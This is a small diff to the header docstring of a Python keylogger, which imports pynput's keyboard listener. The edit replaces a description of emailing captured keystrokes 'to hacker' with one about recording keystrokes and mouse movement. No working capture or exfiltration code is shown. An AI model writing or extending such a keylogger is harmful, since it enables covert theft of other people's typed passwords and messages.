@@ -1,6 +1,5 @@
 '''
-This is an advanced keylogger programmed written in Python3 designed to record keystrokes
-and e-mail txt files to hacker.
+This is an advanced keylogger programmed written in Python3 designed to record keystrokes mouse cursor movement.
 '''
 
 from  pynput.keyboard import Listener
